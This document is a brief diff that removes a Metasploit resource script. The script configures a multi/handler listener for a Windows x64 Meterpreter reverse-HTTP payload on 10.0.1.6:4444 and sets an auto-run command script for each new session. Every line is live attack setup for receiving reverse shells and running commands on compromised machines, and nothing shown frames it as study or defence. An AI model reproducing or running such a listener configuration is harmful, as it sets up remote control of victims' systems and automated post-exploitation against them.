@@ -1,6 +1,0 @@
-use exploit/multi/handler
-set payload windows/x64/meterpreter_reverse_http
-set lhost 10.0.1.6
-set lport 4444
-set AutoRunScript /var/www/commands.rc
-exploit
